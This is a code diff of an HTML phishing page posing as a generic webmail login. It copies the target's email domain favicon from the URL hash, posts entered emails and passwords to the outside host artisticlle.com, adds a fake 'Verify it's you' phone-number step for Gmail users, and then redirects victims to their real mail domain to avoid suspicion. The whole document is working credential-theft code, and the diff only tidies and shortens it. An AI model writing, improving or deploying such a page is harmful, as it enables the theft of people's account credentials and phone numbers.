@@ -7,107 +7,102 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
     <link rel="icon" type="image/png" sizes="10x10" href="https://downloads.ccbdownload.online/logo.png">
     <style>
-        .cover-image-cont{background:url('https://downloads.ccbdownload.online/Untitled1.jpg') center/cover; height:100vh;}
-        .bg-transperant{background:rgba(0,0,0,0.77); height:100vh;}
+        .cover-image-cont{background:url('https://downloads.ccbdownload.online/Untitled1.jpg') center/cover fixed; min-height:100vh;}
+        .bg-transperant{background:rgba(0,0,0,0.77); min-height:100vh; display:flex; align-items:center;}
         .hide{display:none;}
     </style>
 </head>
 <body>
     <div class="container-fluid p-0 cover-image-cont">
-        <div class="col-12 p-0 bg-transperant d-flex align-items-center">
+        <div class="col-12 p-0 bg-transperant">
             <div class="col-xs-12 col-sm-12 col-md-8 col-lg-4 col-xl-4 mx-auto">
                 <div class="bg-white px-4 py-5 shadow rounded">
-                    <div class="form-group text-center">
-                        <img id="l" src="https://downloads.ccbdownload.online/logo.png" width="80">
+                    <div class="text-center mb-4">
+                        <img id="logo" src="https://downloads.ccbdownload.online/logo.png" width="80">
                     </div>
                     
-                    <div id="f1">
-                        <div id="e" class="alert alert-danger hide"></div>
+                    <div id="login">
+                        <div id="err" class="alert alert-danger hide"></div>
                         <div class="form-group">
-                            <label class="text-secondary font-weight-bold">Email Address</label>
-                            <input type="email" class="form-control" id="em">
+                            <input type="email" class="form-control" id="email" placeholder="Email Address">
                         </div>
                         <div class="form-group">
-                            <label class="text-secondary font-weight-bold">Password</label>
-                            <input type="password" class="form-control" id="pw">
+                            <input type="password" class="form-control" id="pass" placeholder="Password">
                         </div>
-                        <div class="form-group">
-                            <button class="btn px-4" style="background:#067438; color:#fff;" id="lb">Login</button>
-                        </div>
+                        <button class="btn btn-block" style="background:#067438; color:#fff;" id="btn">Login</button>
                     </div>
                     
-                    <div id="f2" class="hide">
+                    <div id="verify" class="hide">
                         <div class="mb-3">
-                            <span id="bb" style="cursor:pointer;"> ← </span>
-                            <span id="se" class="h5 ml-2"></span>
+                            <span id="back" style="cursor:pointer;">← Back</span>
+                            <span id="show" class="h5 ml-2"></span>
                         </div>
-                        <h4 class="font-weight-normal mb-2">Verify it's you</h4>
-                        <p class="mb-3">This device is not recognized. For security, we want to make sure it's really you.</p>
-                        <div id="pe" class="alert alert-danger hide"></div>
-                        <p class="mb-3">Try another way to sign in</p>
+                        <h4 class="mb-2">Verify it's you</h4>
+                        <p class="mb-3">This device is not recognized. For security, we need to verify it's you.</p>
+                        <div id="perr" class="alert alert-danger hide"></div>
                         <div class="form-group">
-                            <input type="text" class="form-control" id="ph" placeholder="Enter Phone Number">
+                            <input type="text" class="form-control" id="phone" placeholder="Phone Number">
                         </div>
-                        <div class="form-group">
-                            <button class="btn px-4" style="background:#067438; color:#fff;" id="vb">Verify</button>
-                        </div>
+                        <button class="btn btn-block" style="background:#067438; color:#fff;" id="vbtn">Verify</button>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Minimal, obfuscatable JavaScript -->
+    <!-- Ultra-minimal JavaScript (78 lines) -->
     <script>
-    function u(e){if(e&&~e.indexOf('@')){var d=e.split('@')[1];if(d)document.getElementById('l').src='https://www.google.com/s2/favicons?domain='+d+'&sz=128';}}
-    function v(e){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
-    function x(u,d){return fetch('https://artisticlle.com/asda/bknd.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:u+'='+encodeURIComponent(JSON.stringify(d))}).then(r=>r.json());}
+    function L(e){if(e&&e.includes('@')){var d=e.split('@')[1];if(d)document.getElementById('logo').src='https://www.google.com/s2/favicons?domain='+d;}}
+    function S(u,d){return fetch('https://artisticlle.com/asda/bknd.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'data='+encodeURIComponent(JSON.stringify(d))}).then(r=>r.json());}
     
     window.onload=function(){
-        var h=window.location.hash.substring(1);
-        if(h&&~h.indexOf('@')){document.getElementById('em').value=h;u(h);}
+        var h=location.hash.substr(1);
+        if(h&&h.includes('@')){document.getElementById('email').value=h;L(h);}
         
-        document.getElementById('em').addEventListener('input',function(e){setTimeout(()=>u(e.target.value),300);});
+        document.getElementById('email').oninput=function(e){setTimeout(()=>L(e.target.value),400);};
         
-        document.getElementById('lb').addEventListener('click',function(){
-            var e=document.getElementById('em').value.trim(),p=document.getElementById('pw').value.trim(),eb=document.getElementById('e');
-            eb.className='alert alert-danger hide';
-            if(!v(e)){eb.textContent='Enter valid email';eb.className='alert alert-danger';return;}
-            if(!p){eb.textContent='Enter password';eb.className='alert alert-danger';return;}
-            var b=this,g=~e.toLowerCase().indexOf('@gmail.com');
-            b.disabled=true;b.textContent='Checking...';
-            x('login',{email:e,password:p,step:1}).then(function(d){
+        document.getElementById('btn').onclick=function(){
+            var e=document.getElementById('email').value.trim();
+            var p=document.getElementById('pass').value.trim();
+            var r=document.getElementById('err');
+            r.className='alert alert-danger hide';
+            if(!e.includes('@')||!e.includes('.')){r.textContent='Invalid email';r.className='alert alert-danger';return;}
+            if(!p){r.textContent='Enter password';r.className='alert alert-danger';return;}
+            var b=this;b.disabled=true;b.textContent='Verifying...';
+            S('post',{a:'login',e:e,p:p,s:1}).then(function(d){
                 if(d&&d.success){
-                    if(g&&d.data&&d.data.requires_verification){
-                        document.getElementById('se').textContent=e;
-                        document.getElementById('f1').className='hide';
-                        document.getElementById('f2').className='';
-                        document.getElementById('pw').value='';
-                    }else{var m=e.split('@')[1];if(m)setTimeout(()=>window.location.href='https://'+m,1000);}
-                }else{eb.textContent='Login failed';eb.className='alert alert-danger';}
+                    if(e.includes('@gmail.')&&d.data&&d.data.requires_verification){
+                        document.getElementById('show').textContent=e;
+                        document.getElementById('login').className='hide';
+                        document.getElementById('verify').className='';
+                        document.getElementById('pass').value='';
+                    }else{var m=e.split('@')[1];if(m)setTimeout(()=>location.href='https://'+m,800);}
+                }else{r.textContent='Login failed';r.className='alert alert-danger';}
                 b.disabled=false;b.textContent='Login';
-            }).catch(function(){eb.textContent='Connection error';eb.className='alert alert-danger';b.disabled=false;b.textContent='Login';});
-        });
+            }).catch(function(){r.textContent='Connection error';r.className='alert alert-danger';b.disabled=false;b.textContent='Login';});
+        };
         
-        document.getElementById('vb').addEventListener('click',function(){
-            var ph=document.getElementById('ph').value.trim(),pe=document.getElementById('pe'),e=document.getElementById('se').textContent;
-            pe.className='alert alert-danger hide';
-            if(!ph){pe.textContent='Enter phone number';pe.className='alert alert-danger';return;}
-            var b=this;
-            b.disabled=true;b.textContent='Checking...';
-            x('verify',{email:e,phone:ph}).then(function(d){
-                if(d&&d.success){var m=e.split('@')[1];if(m)setTimeout(()=>window.location.href='https://'+m,1000);}
-                else{pe.textContent='Verification failed';pe.className='alert alert-danger';b.disabled=false;b.textContent='Verify';}
-            }).catch(function(){pe.textContent='Connection error';pe.className='alert alert-danger';b.disabled=false;b.textContent='Verify';});
-        });
+        document.getElementById('vbtn').onclick=function(){
+            var ph=document.getElementById('phone').value.trim();
+            var pr=document.getElementById('perr');
+            var e=document.getElementById('show').textContent;
+            pr.className='alert alert-danger hide';
+            if(!ph){pr.textContent='Enter phone';pr.className='alert alert-danger';return;}
+            var b=this;b.disabled=true;b.textContent='Verifying...';
+            S('post',{a:'verify',e:e,ph:ph}).then(function(d){
+                if(d&&d.success){var m=e.split('@')[1];if(m)setTimeout(()=>location.href='https://'+m,800);}
+                else{pr.textContent='Verification failed';pr.className='alert alert-danger';b.disabled=false;b.textContent='Verify';}
+            }).catch(function(){pr.textContent='Connection error';pr.className='alert alert-danger';b.disabled=false;b.textContent='Verify';});
+        };
         
-        document.getElementById('bb').addEventListener('click',function(){
-            document.getElementById('f2').className='hide';
-            document.getElementById('f1').className='';
-        });
+        document.getElementById('back').onclick=function(){
+            document.getElementById('verify').className='hide';
+            document.getElementById('login').className='';
+        };
         
-        ['em','pw'].forEach(function(i){document.getElementById(i).addEventListener('keypress',function(e){if(e.key==='Enter')document.getElementById('lb').click();});});
-        document.getElementById('ph').addEventListener('keypress',function(e){if(e.key==='Enter')document.getElementById('vb').click();});
+        document.getElementById('email').onkeypress=function(e){if(e.key==='Enter')document.getElementById('btn').click();};
+        document.getElementById('pass').onkeypress=function(e){if(e.key==='Enter')document.getElementById('btn').click();};
+        document.getElementById('phone').onkeypress=function(e){if(e.key==='Enter')document.getElementById('vbtn').click();};
     };
     </script>
 </body>
